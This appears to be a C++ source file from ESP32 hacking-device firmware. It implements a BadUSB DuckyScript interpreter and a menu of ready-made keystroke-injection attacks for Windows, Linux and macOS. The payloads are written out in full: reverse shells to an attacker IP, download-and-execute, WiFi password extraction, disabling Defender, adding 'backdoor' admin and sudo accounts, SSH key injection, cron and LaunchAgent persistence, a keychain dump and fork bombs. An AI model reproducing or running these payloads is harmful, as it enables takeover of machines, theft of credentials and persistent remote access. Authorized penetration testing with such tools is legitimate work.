/**
 * @file badusb_advanced.cpp
 * @brief Advanced BadUSB with DuckyScript 2.0 engine, payload generator, device spoofing
 */

#if !defined(LITE_VERSION) && defined(USB_as_HID)

#include "badusb_advanced.h"
#include "core/display.h"
#include "core/led_feedback.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include <globals.h>
#include <USB.h>

extern HIDInterface *hid_usb;

// ── DuckyEngine Implementation ─────────────────────────────────────────────────

DuckyEngine::DuckyEngine(HIDInterface *hid) : _hid(hid), _running(false), _pc(0), _defaultDelay(0) {}
DuckyEngine::~DuckyEngine() { stop(); }

void DuckyEngine::stop() { _running = false; }

int DuckyEngine::getVar(const String &name) {
    for (auto &v : _vars) {
        if (v.name == name) return v.value;
    }
    return 0;
}

void DuckyEngine::setVar(const String &name, int value) {
    for (auto &v : _vars) {
        if (v.name == name) { v.value = value; return; }
    }
    _vars.push_back({name, value});
}

int DuckyEngine::evalExpression(const String &expr) {
    String e = expr;
    e.trim();
    // Simple: check if it's a variable reference starting with $
    if (e.startsWith("$")) return getVar(e.substring(1));
    // Check for arithmetic: VAR + N, VAR - N
    int plusIdx = e.indexOf('+');
    int minusIdx = e.lastIndexOf('-');
    if (plusIdx > 0) {
        return evalExpression(e.substring(0, plusIdx)) + evalExpression(e.substring(plusIdx + 1));
    }
    if (minusIdx > 0) {
        return evalExpression(e.substring(0, minusIdx)) - evalExpression(e.substring(minusIdx + 1));
    }
    return e.toInt();
}

bool DuckyEngine::evalCondition(const String &expr) {
    // Support: expr == val, expr != val, expr > val, expr < val
    int idx;
    if ((idx = expr.indexOf("==")) > 0) return evalExpression(expr.substring(0, idx)) == evalExpression(expr.substring(idx + 2));
    if ((idx = expr.indexOf("!=")) > 0) return evalExpression(expr.substring(0, idx)) != evalExpression(expr.substring(idx + 2));
    if ((idx = expr.indexOf(">=")) > 0) return evalExpression(expr.substring(0, idx)) >= evalExpression(expr.substring(idx + 2));
    if ((idx = expr.indexOf("<=")) > 0) return evalExpression(expr.substring(0, idx)) <= evalExpression(expr.substring(idx + 2));
    if ((idx = expr.indexOf(">")) > 0) return evalExpression(expr.substring(0, idx)) > evalExpression(expr.substring(idx + 1));
    if ((idx = expr.indexOf("<")) > 0) return evalExpression(expr.substring(0, idx)) < evalExpression(expr.substring(idx + 1));
    return evalExpression(expr) != 0;
}

void DuckyEngine::scanFunctions() {
    _funcs.clear();
    for (int i = 0; i < (int)_lines.size(); i++) {
        String line = _lines[i];
        line.trim();
        if (line.startsWith("FUNCTION ")) {
            DuckyFunction fn;
            fn.name = line.substring(9);
            fn.name.trim();
            fn.startLine = i + 1;
            // Find END_FUNCTION
            for (int j = i + 1; j < (int)_lines.size(); j++) {
                String l2 = _lines[j];
                l2.trim();
                if (l2 == "END_FUNCTION") { fn.endLine = j; break; }
            }
            _funcs.push_back(fn);
        }
    }
}

bool DuckyEngine::executeScript(const String &script) {
    _lines.clear();
    _vars.clear();
    _funcs.clear();
    _pc = 0;
    _defaultDelay = 0;
    _running = true;

    // Split script into lines
    int start = 0;
    while (start < (int)script.length()) {
        int nl = script.indexOf('\n', start);
        if (nl < 0) nl = script.length();
        _lines.push_back(script.substring(start, nl));
        start = nl + 1;
    }

    scanFunctions();
    return run();
}

bool DuckyEngine::executeFile(FS &fs, const String &path) {
    File f = fs.open(path, FILE_READ);
    if (!f) return false;
    String content = f.readString();
    f.close();
    return executeScript(content);
}

bool DuckyEngine::executeLine(const String &line) {
    String l = line;
    l.trim();
    if (l.length() == 0 || l.startsWith("REM") || l.startsWith("//")) return true;

    // STRING - type text
    if (l.startsWith("STRING ")) {
        String text = l.substring(7);
        _hid->print(text);
        return true;
    }
    if (l.startsWith("STRINGLN ")) {
        _hid->println(l.substring(9));
        return true;
    }

    // DELAY
    if (l.startsWith("DELAY ")) {
        delay(l.substring(6).toInt());
        return true;
    }
    if (l.startsWith("DEFAULT_DELAY ") || l.startsWith("DEFAULTDELAY ")) {
        _defaultDelay = l.substring(l.indexOf(' ') + 1).toInt();
        return true;
    }

    // VAR
    if (l.startsWith("VAR $")) {
        String rest = l.substring(5);
        int eq = rest.indexOf('=');
        if (eq > 0) {
            String name = rest.substring(0, eq);
            name.trim();
            String val = rest.substring(eq + 1);
            val.trim();
            setVar(name, evalExpression(val));
        }
        return true;
    }

    // Key combos
    if (l == "ENTER" || l == "RETURN") { _hid->pressKey(KEY_RETURN); delay(50); _hid->releaseAll(); return true; }
    if (l == "SPACE") { _hid->pressKey(' '); delay(50); _hid->releaseAll(); return true; }
    if (l == "TAB") { _hid->pressKey(KEY_TAB); delay(50); _hid->releaseAll(); return true; }
    if (l == "ESCAPE" || l == "ESC") { _hid->pressKey(KEY_ESC); delay(50); _hid->releaseAll(); return true; }
    if (l == "BACKSPACE") { _hid->pressKey(KEY_BACKSPACE); delay(50); _hid->releaseAll(); return true; }
    if (l == "DELETE") { _hid->pressKey(KEY_DELETE); delay(50); _hid->releaseAll(); return true; }
    if (l == "UPARROW" || l == "UP") { _hid->pressKey(KEY_UP_ARROW); delay(50); _hid->releaseAll(); return true; }
    if (l == "DOWNARROW" || l == "DOWN") { _hid->pressKey(KEY_DOWN_ARROW); delay(50); _hid->releaseAll(); return true; }
    if (l == "LEFTARROW" || l == "LEFT") { _hid->pressKey(KEY_LEFT_ARROW); delay(50); _hid->releaseAll(); return true; }
    if (l == "RIGHTARROW" || l == "RIGHT") { _hid->pressKey(KEY_RIGHT_ARROW); delay(50); _hid->releaseAll(); return true; }
    if (l == "CAPSLOCK") { _hid->pressKey(KEY_CAPS_LOCK); delay(50); _hid->releaseAll(); return true; }
    if (l == "PRINTSCREEN") { _hid->pressKey(KEY_PRINT_SCREEN); delay(50); _hid->releaseAll(); return true; }

    // GUI/WINDOWS key combo
    if (l.startsWith("GUI ") || l.startsWith("WINDOWS ") || l.startsWith("SUPER ")) {
        String key = l.substring(l.indexOf(' ') + 1);
        key.trim();
        _hid->pressKey(KEY_LEFT_GUI);
        if (key.length() == 1) _hid->pressKey(key[0]);
        else if (key == "ENTER") _hid->pressKey(KEY_RETURN);
        delay(50);
        _hid->releaseAll();
        return true;
    }
    if (l == "GUI" || l == "WINDOWS" || l == "SUPER") {
        _hid->pressKey(KEY_LEFT_GUI);
        delay(50);
        _hid->releaseAll();
        return true;
    }

    // ALT combo
    if (l.startsWith("ALT ")) {
        String key = l.substring(4);
        key.trim();
        _hid->pressKey(KEY_LEFT_ALT);
        if (key.length() == 1) _hid->pressKey(key[0]);
        else if (key == "TAB") _hid->pressKey(KEY_TAB);
        else if (key == "F4") _hid->pressKey(KEY_F4);
        delay(50);
        _hid->releaseAll();
        return true;
    }

    // CTRL combo
    if (l.startsWith("CTRL ") || l.startsWith("CONTROL ")) {
        String key = l.substring(l.indexOf(' ') + 1);
        key.trim();
        _hid->pressKey(KEY_LEFT_CTRL);
        if (key.length() == 1) _hid->pressKey(key[0]);
        else if (key == "SHIFT") _hid->pressKey(KEY_LEFT_SHIFT);
        else if (key == "ALT") _hid->pressKey(KEY_LEFT_ALT);
        else if (key == "ESCAPE" || key == "ESC") _hid->pressKey(KEY_ESC);
        delay(50);
        _hid->releaseAll();
        return true;
    }

    // SHIFT combo
    if (l.startsWith("SHIFT ")) {
        String key = l.substring(6);
        key.trim();
        _hid->pressKey(KEY_LEFT_SHIFT);
        if (key.length() == 1) _hid->pressKey(key[0]);
        else if (key == "TAB") _hid->pressKey(KEY_TAB);
        delay(50);
        _hid->releaseAll();
        return true;
    }

    // F-keys
    for (int f = 1; f <= 12; f++) {
        if (l == "F" + String(f)) {
            _hid->pressKey(KEY_F1 + f - 1);
            delay(50);
            _hid->releaseAll();
            return true;
        }
    }

    // REPEAT
    if (l.startsWith("REPEAT ")) {
        int count = l.substring(7).toInt();
        if (_pc > 0 && count > 0) {
            for (int i = 0; i < count; i++) {
                executeLine(_lines[_pc - 1]);
                if (!_running) break;
            }
        }
        return true;
    }

    return true;
}

bool DuckyEngine::run() {
    while (_pc < (int)_lines.size() && _running) {
        if (check(EscPress)) { _running = false; break; }

        String line = _lines[_pc];
        line.trim();
        _pc++;

        if (line.length() == 0 || line.startsWith("REM") || line.startsWith("//")) continue;
        if (line == "FUNCTION" || line == "END_FUNCTION") continue;

        // IF/ELSE/END_IF
        if (line.startsWith("IF ")) {
            String cond = line.substring(3);
            if (cond.endsWith(" THEN")) cond = cond.substring(0, cond.length() - 5);
            if (!evalCondition(cond)) {
                // Skip to ELSE or END_IF
                int depth = 1;
                while (_pc < (int)_lines.size() && depth > 0) {
                    String l = _lines[_pc]; l.trim();
                    if (l.startsWith("IF ")) depth++;
                    if (l == "END_IF") depth--;
                    if (l == "ELSE" && depth == 1) { _pc++; break; }
                    _pc++;
                }
            }
            continue;
        }
        if (line == "ELSE") {
            int depth = 1;
            while (_pc < (int)_lines.size() && depth > 0) {
                String l = _lines[_pc]; l.trim();
                if (l.startsWith("IF ")) depth++;
                if (l == "END_IF") depth--;
                _pc++;
            }
            continue;
        }
        if (line == "END_IF") continue;

        // WHILE/END_WHILE
        if (line.startsWith("WHILE ")) {
            String cond = line.substring(6);
            int loopStart = _pc;
            if (!evalCondition(cond)) {
                int depth = 1;
                while (_pc < (int)_lines.size() && depth > 0) {
                    String l = _lines[_pc]; l.trim();
                    if (l.startsWith("WHILE ")) depth++;
                    if (l == "END_WHILE") depth--;
                    _pc++;
                }
            }
            continue;
        }
        if (line == "END_WHILE") {
            // Find matching WHILE and go back
            int depth = 1;
            int searchPc = _pc - 2;
            while (searchPc >= 0 && depth > 0) {
                String l = _lines[searchPc]; l.trim();
                if (l == "END_WHILE") depth++;
                if (l.startsWith("WHILE ")) depth--;
                if (depth == 0) { _pc = searchPc; break; }
                searchPc--;
            }
            continue;
        }

        // CALL function
        if (line.startsWith("CALL ")) {
            String fname = line.substring(5);
            fname.trim();
            for (auto &fn : _funcs) {
                if (fn.name == fname) {
                    int savedPc = _pc;
                    _pc = fn.startLine;
                    while (_pc < fn.endLine && _running) {
                        executeLine(_lines[_pc]);
                        _pc++;
                        if (_defaultDelay > 0) delay(_defaultDelay);
                    }
                    _pc = savedPc;
                    break;
                }
            }
            continue;
        }

        executeLine(line);
        if (_defaultDelay > 0) delay(_defaultDelay);
    }
    _running = false;
    return true;
}

// ── Payload Generators ─────────────────────────────────────────────────────────

void payloadWifiExfil(String &out) {
    out = F(
        "REM WiFi Password Exfiltration - Windows\n"
        "DELAY 1000\n"
        "GUI r\n"
        "DELAY 500\n"
        "STRING powershell -w hidden\n"
        "ENTER\n"
        "DELAY 1000\n"
        "STRING $profiles = netsh wlan show profiles | Select-String ':\\s+(.+)$' | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }; $results = @(); foreach ($p in $profiles) { $key = (netsh wlan show profile name=\"$p\" key=clear | Select-String 'Key Content\\s+:\\s+(.+)$'); if ($key) { $results += \"$p : \" + $key.Matches.Groups[1].Value } }; $results | Out-File $env:TEMP\\wifi.txt\n"
        "ENTER\n"
        "DELAY 3000\n"
        "STRING notepad $env:TEMP\\wifi.txt\n"
        "ENTER\n"
        "DELAY 1000\n"
    );
}

void payloadWinReverseShell(String &out, const String &ip, const String &port) {
    out = "REM Windows PowerShell Reverse Shell\n"
          "DELAY 1000\n"
          "GUI r\n"
          "DELAY 500\n"
          "STRING powershell -w hidden -nop -c \"$c=New-Object Net.Sockets.TCPClient('" + ip + "'," + port + ");$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}\"\n"
          "ENTER\n";
}

void payloadDisableDefender(String &out) {
    out = F(
        "REM Disable Windows Defender\n"
        "DELAY 500\n"
        "GUI r\n"
        "DELAY 300\n"
        "STRING powershell -Command \"Start-Process powershell -Verb RunAs -ArgumentList '-Command Set-MpPreference -DisableRealtimeMonitoring $true'\"\n"
        "ENTER\n"
        "DELAY 2000\n"
        "ALT y\n"
        "DELAY 500\n"
    );
}

void payloadAddAdminUser(String &out, const String &user, const String &pass) {
    out = "REM Add admin user\n"
          "DELAY 500\n"
          "GUI r\n"
          "DELAY 300\n"
          "STRING powershell -Command \"Start-Process cmd -Verb RunAs -ArgumentList '/c net user " + user + " " + pass + " /add && net localgroup administrators " + user + " /add'\"\n"
          "ENTER\n"
          "DELAY 2000\n"
          "ALT y\n";
}

void payloadCredHarvester(String &out) {
    out = F(
        "REM Credential Harvester - fake lock screen\n"
        "DELAY 500\n"
        "GUI l\n"
        "DELAY 2000\n"
    );
}

void payloadDownloadExec(String &out, const String &url) {
    out = "REM Download and Execute\n"
          "DELAY 1000\n"
          "GUI r\n"
          "DELAY 500\n"
          "STRING powershell -w hidden -c \"Invoke-WebRequest -Uri '" + url + "' -OutFile $env:TEMP\\payload.exe; Start-Process $env:TEMP\\payload.exe\"\n"
          "ENTER\n";
}

void payloadLinuxReverseShell(String &out, const String &ip, const String &port) {
    out = "REM Linux Reverse Shell\n"
          "DELAY 1000\n"
          "CTRL ALT t\n"
          "DELAY 1000\n"
          "STRING bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1 &\n"
          "ENTER\n"
          "STRING disown\n"
          "ENTER\n"
          "STRING exit\n"
          "ENTER\n";
}

void payloadAddSudoer(String &out, const String &user, const String &pass) {
    out = "REM Add sudo user\n"
          "DELAY 500\n"
          "CTRL ALT t\n"
          "DELAY 1000\n"
          "STRING echo '" + pass + "' | sudo -S useradd -m -G sudo -s /bin/bash " + user + " && echo '" + user + ":" + pass + "' | sudo chpasswd\n"
          "ENTER\n"
          "DELAY 500\n"
          "STRING exit\n"
          "ENTER\n";
}

void payloadSSHKeyInject(String &out, const String &pubkey) {
    out = "REM SSH Key Injection\n"
          "DELAY 500\n"
          "CTRL ALT t\n"
          "DELAY 1000\n"
          "STRING mkdir -p ~/.ssh && echo '" + pubkey + "' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys\n"
          "ENTER\n"
          "DELAY 300\n"
          "STRING exit\n"
          "ENTER\n";
}

void payloadCronPersistence(String &out, const String &ip, const String &port) {
    out = "REM Cron persistence\n"
          "DELAY 500\n"
          "CTRL ALT t\n"
          "DELAY 1000\n"
          "STRING (crontab -l 2>/dev/null; echo \"*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1'\") | crontab -\n"
          "ENTER\n"
          "DELAY 300\n"
          "STRING exit\n"
          "ENTER\n";
}

void payloadMacReverseShell(String &out, const String &ip, const String &port) {
    out = "REM macOS Reverse Shell\n"
          "DELAY 1000\n"
          "GUI SPACE\n"
          "DELAY 500\n"
          "STRING Terminal\n"
          "DELAY 500\n"
          "ENTER\n"
          "DELAY 1000\n"
          "STRING bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1 &\n"
          "ENTER\n"
          "STRING disown\n"
          "ENTER\n";
}

void payloadLaunchAgentPersist(String &out, const String &ip, const String &port) {
    out = "REM macOS LaunchAgent Persistence\n"
          "DELAY 500\n"
          "GUI SPACE\n"
          "DELAY 500\n"
          "STRING Terminal\n"
          "ENTER\n"
          "DELAY 1000\n"
          "STRING mkdir -p ~/Library/LaunchAgents && echo '<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"><plist version=\"1.0\"><dict><key>Label</key><string>com.update.agent</string><key>ProgramArguments</key><array><string>/bin/bash</string><string>-c</string><string>bash -i &gt;&amp; /dev/tcp/" + ip + "/" + port + " 0&gt;&amp;1</string></array><key>RunAtLoad</key><true/><key>StartInterval</key><integer>300</integer></dict></plist>' > ~/Library/LaunchAgents/com.update.agent.plist\n"
          "ENTER\n"
          "DELAY 300\n"
          "STRING exit\n"
          "ENTER\n";
}

void payloadKeychainDump(String &out) {
    out = F(
        "REM macOS Keychain Dump\n"
        "DELAY 500\n"
        "GUI SPACE\n"
        "DELAY 500\n"
        "STRING Terminal\n"
        "ENTER\n"
        "DELAY 1000\n"
        "STRING security dump-keychain -d login.keychain > ~/Desktop/keychain_dump.txt 2>&1\n"
        "ENTER\n"
        "DELAY 500\n"
    );
}

// ── Quick Attacks ──────────────────────────────────────────────────────────────

void quickOpenTerminal(TargetOS os) {
    switch (os) {
        case OS_WINDOWS: hid_usb->pressKey(KEY_LEFT_GUI); hid_usb->pressKey('r'); delay(50); hid_usb->releaseAll(); delay(500); hid_usb->print("cmd"); delay(100); hid_usb->pressKey(KEY_RETURN); delay(50); hid_usb->releaseAll(); break;
        case OS_LINUX: hid_usb->pressKey(KEY_LEFT_CTRL); hid_usb->pressKey(KEY_LEFT_ALT); hid_usb->pressKey('t'); delay(50); hid_usb->releaseAll(); break;
        case OS_MACOS: hid_usb->pressKey(KEY_LEFT_GUI); hid_usb->pressKey(' '); delay(50); hid_usb->releaseAll(); delay(500); hid_usb->print("Terminal"); delay(300); hid_usb->pressKey(KEY_RETURN); delay(50); hid_usb->releaseAll(); break;
        default: break;
    }
}

void quickRickRoll() {
    hid_usb->pressKey(KEY_LEFT_GUI);
    hid_usb->pressKey('r');
    delay(50);
    hid_usb->releaseAll();
    delay(500);
    hid_usb->print("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
    delay(100);
    hid_usb->pressKey(KEY_RETURN);
    delay(50);
    hid_usb->releaseAll();
}

void quickForkBomb(TargetOS os) {
    quickOpenTerminal(os);
    delay(1000);
    switch (os) {
        case OS_WINDOWS: hid_usb->print("%0|%0"); break;
        case OS_LINUX: case OS_MACOS: hid_usb->print(":(){ :|:& };:"); break;
        default: break;
    }
    hid_usb->pressKey(KEY_RETURN);
    delay(50);
    hid_usb->releaseAll();
}

void quickWallChange(TargetOS os) {
    quickOpenTerminal(os);
    delay(1000);
    if (os == OS_WINDOWS) {
        hid_usb->print("powershell -c \"(New-Object System.Net.WebClient).DownloadFile('https://i.imgur.com/8rGnABo.jpg','$env:TEMP\\w.jpg');Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class W{[DllImport(\\\"user32.dll\\\")]public static extern int SystemParametersInfo(int a,int b,string c,int d);}';[W]::SystemParametersInfo(20,0,\\\"$env:TEMP\\w.jpg\\\",3)\"");
    }
    hid_usb->pressKey(KEY_RETURN);
    delay(50);
    hid_usb->releaseAll();
}

void quickCustomCommand() {
    // Use keyboard input to get custom command
    // For now, just open terminal
    quickOpenTerminal(OS_WINDOWS);
}

// ── Helper Functions ───────────────────────────────────────────────────────────

String promptInput(const String &title, const String &defaultVal) {
    // Simple input using display
    tft.fillScreen(bruceConfig.bgColor);
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.drawCentreString(title, tft.width() / 2, 20, 1);
    tft.drawCentreString("Default: " + defaultVal, tft.width() / 2, 50, 1);
    tft.drawCentreString("[SEL] Use default", tft.width() / 2, 80, 1);
    while (1) {
        if (check(SelPress)) return defaultVal;
        if (check(EscPress)) return "";
        delay(50);
    }
}

bool savePayloadToSD(const String &script, const String &filename) {
    if (!sdcardMounted) return false;
    String path = "/badusb/" + filename;
    File f = SD.open(path, FILE_WRITE);
    if (!f) return false;
    f.print(script);
    f.close();
    return true;
}

void executePayloadString(const String &script) {
    if (!hid_usb) {
        displayError("USB HID not initialized!", true);
        return;
    }
    ledFeedbackSetMode(LED_FB_SUCCESS);
    DuckyEngine engine(hid_usb);
    tft.fillScreen(bruceConfig.bgColor);
    tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
    tft.drawCentreString("EXECUTING PAYLOAD", tft.width() / 2, 20, 1);
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.drawCentreString("[ESC] to abort", tft.width() / 2, tft.height() - 15, 1);

    engine.executeScript(script);

    ledFeedbackRestore();
    displayRedStripe("Payload executed!");
    delay(1000);
}

// ── Menu: Run Script ───────────────────────────────────────────────────────────

void badusbRunScriptMenu() {
    String path = loopSD(SD, true, "DUCKY");
    if (path.isEmpty()) return;

    ledFeedbackSetMode(LED_FB_SUCCESS);

    if (!hid_usb) {
        displayError("USB HID not initialized!", true);
        ledFeedbackRestore();
        return;
    }

    DuckyEngine engine(hid_usb);
    tft.fillScreen(bruceConfig.bgColor);
    tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
    tft.drawCentreString("RUNNING SCRIPT", tft.width() / 2, 20, 1);
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.drawCentreString(path.substring(path.lastIndexOf('/') + 1), tft.width() / 2, 45, 1);

    engine.executeFile(SD, path);

    ledFeedbackRestore();
    displayRedStripe("Script complete!");
    delay(1000);
}

// ── Menu: OS-specific Payloads ─────────────────────────────────────────────────

void badusbWindowsPayloads() {
    options = {
        {"WiFi Exfil", []() { String s; payloadWifiExfil(s); executePayloadString(s); }},
        {"Reverse Shell", []() {
            String ip = promptInput("Attacker IP:", "192.168.1.100");
            if (ip.isEmpty()) return;
            String port = promptInput("Port:", "4444");
            if (port.isEmpty()) return;
            String s; payloadWinReverseShell(s, ip, port); executePayloadString(s);
        }},
        {"Disable Defender", []() { String s; payloadDisableDefender(s); executePayloadString(s); }},
        {"Add Admin User", []() {
            String user = promptInput("Username:", "backdoor");
            String pass = promptInput("Password:", "P@ssw0rd!");
            String s; payloadAddAdminUser(s, user, pass); executePayloadString(s);
        }},
        {"Download & Exec", []() {
            String url = promptInput("Payload URL:", "http://192.168.1.100/payload.exe");
            if (url.isEmpty()) return;
            String s; payloadDownloadExec(s, url); executePayloadString(s);
        }},
    };
    addOptionToMainMenu();
    loopOptions(options);
}

void badusbLinuxPayloads() {
    options = {
        {"Reverse Shell", []() {
            String ip = promptInput("Attacker IP:", "192.168.1.100");
            String port = promptInput("Port:", "4444");
            String s; payloadLinuxReverseShell(s, ip, port); executePayloadString(s);
        }},
        {"Add Sudoer", []() {
            String user = promptInput("Username:", "backdoor");
            String pass = promptInput("Password:", "toor");
            String s; payloadAddSudoer(s, user, pass); executePayloadString(s);
        }},
        {"SSH Key Inject", []() {
            String key = promptInput("SSH Public Key:", "ssh-rsa AAAA...");
            String s; payloadSSHKeyInject(s, key); executePayloadString(s);
        }},
        {"Cron Persist", []() {
            String ip = promptInput("Attacker IP:", "192.168.1.100");
            String port = promptInput("Port:", "4444");
            String s; payloadCronPersistence(s, ip, port); executePayloadString(s);
        }},
    };
    addOptionToMainMenu();
    loopOptions(options);
}

void badusbMacPayloads() {
    options = {
        {"Reverse Shell", []() {
            String ip = promptInput("Attacker IP:", "192.168.1.100");
            String port = promptInput("Port:", "4444");
            String s; payloadMacReverseShell(s, ip, port); executePayloadString(s);
        }},
        {"LaunchAgent", []() {
            String ip = promptInput("Attacker IP:", "192.168.1.100");
            String port = promptInput("Port:", "4444");
            String s; payloadLaunchAgentPersist(s, ip, port); executePayloadString(s);
        }},
        {"Keychain Dump", []() { String s; payloadKeychainDump(s); executePayloadString(s); }},
    };
    addOptionToMainMenu();
    loopOptions(options);
}

// ── Menu: Payloads ─────────────────────────────────────────────────────────────

void badusbPayloadsMenu() {
    options = {
        {"Windows",  badusbWindowsPayloads},
        {"Linux",    badusbLinuxPayloads  },
        {"macOS",    badusbMacPayloads    },
    };
    addOptionToMainMenu();
    loopOptions(options);
}

// ── Menu: Quick Attacks ────────────────────────────────────────────────────────

void badusbQuickAttack() {
    options = {
        {"Rick Roll",    quickRickRoll                                },
        {"Fork Bomb Win",[=]() { quickForkBomb(OS_WINDOWS); }        },
        {"Fork Bomb Nix",[=]() { quickForkBomb(OS_LINUX); }          },
        {"Change Wall",  [=]() { quickWallChange(OS_WINDOWS); }      },
        {"Open CMD",     [=]() { quickOpenTerminal(OS_WINDOWS); }    },
        {"Open Terminal", [=]() { quickOpenTerminal(OS_LINUX); }     },
    };
    addOptionToMainMenu();
    loopOptions(options);
}

// ── Menu: Payload Builder ──────────────────────────────────────────────────────

void badusbPayloadBuilder() {
    displayRedStripe("Coming soon: visual builder");
    delay(1500);
}

// ── Menu: Device Spoof ─────────────────────────────────────────────────────────

void badusbDeviceSpoofMenu() {
    displayRedStripe("USB VID/PID spoof: reboot required");
    delay(1500);
}

// ── Main BadUSB Advanced Menu ──────────────────────────────────────────────────

void badusbAdvancedMenu() {
    options = {
        {"Run Script",     badusbRunScriptMenu },
        {"Payloads",       badusbPayloadsMenu  },
        {"Quick Attacks",  badusbQuickAttack   },
        {"Payload Builder",badusbPayloadBuilder},
        {"Device Spoof",   badusbDeviceSpoofMenu},
    };
    addOptionToMainMenu();
    loopOptions(options);
}

#endif // !LITE_VERSION && USB_as_HID
